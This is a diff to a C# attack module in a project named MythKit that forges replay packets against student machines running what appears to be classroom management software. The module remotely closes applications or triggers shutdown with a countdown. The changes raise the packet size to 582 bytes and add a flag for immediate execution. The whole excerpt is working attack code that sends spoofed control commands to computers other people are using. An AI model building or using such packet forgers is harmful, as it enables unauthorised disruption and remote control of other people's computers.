@@ -15,7 +15,7 @@ namespace MythKit.Pages.ReplayAttack.AttackPatterns
             InitializeComponent();
         }
 
-        public string AttackName => "电源控制/关闭窗口";
+        public string AttackName => "电源控制/关闭应用";
         public string AttackId => "dmoc_extra_attack";
         public AttackTarget Target => AttackTarget.Student;
 
@@ -70,11 +70,11 @@ namespace MythKit.Pages.ReplayAttack.AttackPatterns
 
         public AttackPacket ConstructPacket(ref string errorMessage, IPAddress targetIP, int cycleId, int groupId)
         {
-            byte[] msg = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Message.Text, targetIP.ToString(), cycleId, groupId));
+            byte[] msg = Encoding.Unicode.GetBytes(AttackPacket.FormatString(Message.Text, targetIP, cycleId, groupId));
 
-            if (0x44 + msg.Length > 554)
+            if (0x44 + msg.Length > 582)
             {
-                errorMessage = $"消息过长，需要 {0x44 + msg.Length} 字节，最大 554。";
+                errorMessage = $"消息过长，需要 {0x44 + msg.Length} 字节，最大 582。";
                 return new AttackPacket(new List<byte[]> { });
             }
 
@@ -109,6 +109,8 @@ namespace MythKit.Pages.ReplayAttack.AttackPatterns
             // 类型写入
             packet[0x34] = (byte)(CloseApplicationRadioButton.IsChecked == true ? 0x02 : ShutdownRadioButton.IsChecked == true ? 0x14 : 0x13);
 
+            // 是否立即执行
+            packet[0x37] = (byte)(ImmediateExecutionCheckBox.IsChecked == true ? 0x10 : 0x00);
             // 倒计时写入
             uint countdown = (uint)(Countdown.Value);
             packet[0x38] = (byte)(countdown & 0xFF);
@@ -116,8 +118,8 @@ namespace MythKit.Pages.ReplayAttack.AttackPatterns
             packet[0x3A] = (byte)((countdown >> 16) & 0xFF);
             packet[0x3B] = (byte)((countdown >> 24) & 0xFF);
 
-            // 构造最终 554 字节数组，复制头部 + 字符串，其余自动 0
-            byte[] result = new byte[554];
+            // 构造最终 582 字节数组，复制头部 + 字符串，其余自动 0
+            byte[] result = new byte[582];
             Array.Copy(packet, 0, result, 0, packet.Length);
             Array.Copy(msg, 0, result, 0x44, msg.Length);
 
